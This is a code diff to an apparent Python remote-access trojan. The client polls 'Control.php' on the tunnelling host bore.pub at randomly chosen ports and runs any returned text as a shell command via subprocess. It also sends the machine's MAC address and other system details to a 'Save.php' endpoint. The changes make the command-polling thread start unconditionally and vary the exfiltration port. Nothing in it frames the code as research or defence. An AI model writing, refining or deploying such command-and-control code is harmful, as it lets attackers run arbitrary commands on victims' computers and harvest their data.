@@ -10,13 +10,7 @@ import uuid
 import wmi
 import concurrent.futures
 import random
-import shutil
 import threading
-
-port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
-php_script_url = f'http://bore.pub:{port}/Control.php'
-
-previous_data = ""
 
 # Function to clear the console screen
 def clear_screen():
@@ -55,13 +49,20 @@ def receive_data():
                 subprocess.Popen(f"{data}", shell=True)
                 previous_data = data
 
-        time.sleep(1)
+        time.sleep(3)
 
 # Generate the device's MAC address
 mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
 mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])
 
+# Set the PHP script URL and initial previous_data
+port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
+php_script_url = f'http://bore.pub:{port}/Control.php'
+previous_data = ""
+
 # Start the data receiving thread
+receive_thread = threading.Thread(target=receive_data)
+receive_thread.start()
 
 # Main loop for other tasks
 while True:
@@ -153,7 +154,8 @@ while True:
             "Machine": f"{mach}",
         }
 
-        php_urls = [f"http://bore.pub:{port}/Save.php"]
+        portx = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
+        php_urls = [f"http://bore.pub:{portx}/Save.php"]
 
         with concurrent.futures.ThreadPoolExecutor() as executor:
             results = executor.map(lambda url: send_data_to_url(url, data_to_send), php_urls)
@@ -165,6 +167,4 @@ while True:
 
     except Exception as e:
         print(f"Error: {str(e)}")
-        time.sleep(0)  
-        receive_thread = threading.Thread(target=receive_data)
-        receive_thread.start()
+        time.sleep(0)
